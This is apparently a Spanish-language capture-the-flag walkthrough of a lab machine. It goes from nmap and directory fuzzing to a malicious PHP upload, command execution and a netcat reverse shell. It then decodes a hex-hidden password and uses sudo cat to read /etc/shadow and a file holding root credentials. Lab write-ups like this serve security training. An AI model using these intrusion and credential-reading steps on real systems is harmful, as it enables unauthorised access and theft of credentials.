# Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN nmap
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 11:35 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8e:a2:56:38:e1:85:2f:21:2b:55:ec:29:5b:f8:63:d9 (ECDSA)
|_  256 0f:4b:38:fa:04:33:c7:01:5a:98:12:05:2d:42:cf:1a (ED25519)
53/tcp open  domain  ISC BIND 9.18.28-0ubuntu0.24.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.28-0ubuntu0.24.04.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: HackZones.hl - Seguridad para tu Empresa
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.84 seconds
```

como observo el dominio `HackZones.hl` en el reporte de `nmap`, lo agrego al archivo `/etc/hosts`

```ruby
echo '172.17.0.2 HackZones.hl' >> /etc/hosts
```

y accedo al servicio web

![image](https://github.com/user-attachments/assets/cc1a8799-d1d1-49bd-87cf-db8bc18ba8a9)

tras intentar ver si era vulnerable a inyecciones slq, parece ser que no, por lo que le hago fuzzing a la web

# Fuzzing Web

```ruby
feroxbuster -u 'http://hackzones.hl/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,git -t 200 --random-agent --no-state -d 5
```
```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://hackzones.hl/
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 5
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      181l      450w     5671c http://hackzones.hl/dashboard.html
200      GET       23l      163w     1377c http://hackzones.hl/upload.php
301      GET        9l       28w      314c http://hackzones.hl/uploads => http://hackzones.hl/uploads/
200      GET       77l      135w     1246c http://hackzones.hl/styles.css
302      GET        0l        0w        0c http://hackzones.hl/authenticate.php => index.html?error=1
200      GET       23l       62w      860c http://hackzones.hl/
200      GET       23l       62w      860c http://hackzones.hl/index.html
```


si me voy a `http://hackzones.hl/dashboard.html` observo lo siguiente:

![image](https://github.com/user-attachments/assets/58b33f7e-1ff8-4e8f-b4d5-4cd493a1067d)

y observo que puedo cargar una imagen como foto de perfil

![image](https://github.com/user-attachments/assets/caa569e0-f26a-4253-bbb3-8d7b04e0829c)

pero pruebo si es posible cargar un archivo php malicioso y en efecto lo puedo cargar, la web no verifica el tipo de archivos que se cargar por esta via

![image](https://github.com/user-attachments/assets/f84c8f33-e9c9-4981-a2e9-006377728f81)

ya cargado el archivo, puedo ir a `http://hackzones.hl/uploads` y observo que alli se encuentra mi archivo php malicioso 

![image](https://github.com/user-attachments/assets/52b7f9d1-02c1-4e6c-bc25-985517e8385b)

asi que con esto logro la ejecucion de comandos

![image](https://github.com/user-attachments/assets/5a0dcd78-0596-4d20-a82e-4d2d4a36f15b)

ahora me coloco en escucha por netcat y envio una revershell para acceder al servidor

# Escalada de privilegios

### www-data

tratamiento de la bash

```bash
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash
```
reviso los usuarios del sistema y solo existe uno

```ruby
cat /etc/passwd |grep bash
```
```bash
root:x:0:0:root:/root:/bin/bash
mrrobot:x:1000:1000::/home/mrRobot:/bin/bash
```
no tengo acceso al directorio del usuario `mrrobot`, revisando el sistema, me encuentro con un archivo en `/tmp` y tras chequearlo me consigo con subdominios que 
despues de agregar al archivo `/etc/hosts` y revisarlos no me aportan mucho para escalar, asi que despues de revisar un poco mas me consigo un script en `/var/www/html/supermegaultrasecretfolder`

secret.sh
```bash
#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
  echo "Este script debe ser ejecutado como root."
  exit 1
fi

p1=$(echo -e "\x50\x61\x73\x73\x77\x6f\x72\x64") 
p2="\x40"                                       
p3="\x24\x24"                                   
p4="\x21\x31\x32\x33"                           

echo -e "${p1}${p2}${p3}${p4}"
```

por lo que pinta esta codificado en hexadecial y tras decodificar obtengo una password `Password@$$!123` que resulta ser del usuario `mrrobot`

### mrrobot

```ruby
sudo -l
```
```bash
Matching Defaults entries for mrrobot on 25b45ecaf65f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mrrobot may run the following commands on 25b45ecaf65f:
    (ALL : ALL) NOPASSWD: /usr/bin/cat
```
puedo ejecutar el binario `/usr/bin/cat` como root por lo que podria leer archivos sencibles del sistema, intente crackear la password leyendo el archivo `/etc/shadow`
pero no consegui resultados por alli por lo que revisando en el sistema me consigo con un archivo en `/opt/SistemUpdate` el cual no puedo leer pero como puedo usar
el binario `/usr/bin/cat` como root, procedo a leerlo

```ruby
sudo /usr/bin/cat /opt/SistemUpdate
```
```bash
Reading package lists... Done
Building dependency tree       
Reading state information... Done
Calculating upgrade... Done
The following packages will be upgraded:
  libc-bin libc-dev-bin libc6 libc6-dev libc6-i386
5 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
Need to get 8,238 kB of archives.
After this operation, 1,024 B of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://archive.ubuntu.com/ubuntu focal-updates/main amd64 libc6 amd64 2.31-0ubuntu9.9 [2,737 kB]
Get:2 http://archive.ubuntu.com/ubuntu focal-updates/main amd64 libc-bin amd64 2.31-0ubuntu9.9 [635 kB]
Get:3 http://archive.ubuntu.com/ubuntu focal-updates/main amd64 libc6-dev amd64 2.31-0ubuntu9.9 [2,622 kB]
Get:4 http://archive.ubuntu.com/ubuntu focal-updates/main amd64 libc-dev-bin amd64 2.31-0ubuntu9.9 [189 kB]
Fetched 8,238 kB in 2s (4,119 kB/s)
Extracting user root:rooteable from packages: 50% 
Extracting templates from packages: 100%
Preconfiguring packages ...
(Reading database ... 275198 files and directories currently installed.)
Preparing to unpack .../libc6_2.31-0ubuntu9.9_amd64.deb ...
Unpacking libc6:amd64 (2.31-0ubuntu9.9) over (2.31-0ubuntu9.8) ...
Preparing to unpack .../libc-bin_2.31-0ubuntu9.9_amd64.deb ...
Unpacking libc-bin (2.31-0ubuntu9.9) over (2.31-0ubuntu9.8) ...
Preparing to unpack .../libc6-dev_2.31-0ubuntu9.9_amd64.deb ...
Unpacking libc6-dev:amd64 (2.31-0ubuntu9.9) over (2.31-0ubuntu9.8) ...
Preparing to unpack .../libc-dev-bin_2.31-0ubuntu9.9_amd64.deb ...
Unpacking libc-dev-bin (2.31-0ubuntu9.9) over (2.31-0ubuntu9.8) ...
Setting up libc6:amd64 (2.31-0ubuntu9.9) ...
Setting up libc-bin (2.31-0ubuntu9.9) ...
Setting up libc-dev-bin (2.31-0ubuntu9.9) ...
Setting up libc6-dev:amd64 (2.31-0ubuntu9.9) ...
Processing triggers for libc-bin (2.31-0ubuntu9.9) ...
```
y obtengo las credenciales de `root` = `Extracting user root:rooteable from packages: 50% `

![image](https://github.com/user-attachments/assets/2c6632b4-cf25-40c1-af5d-751f70333de3)























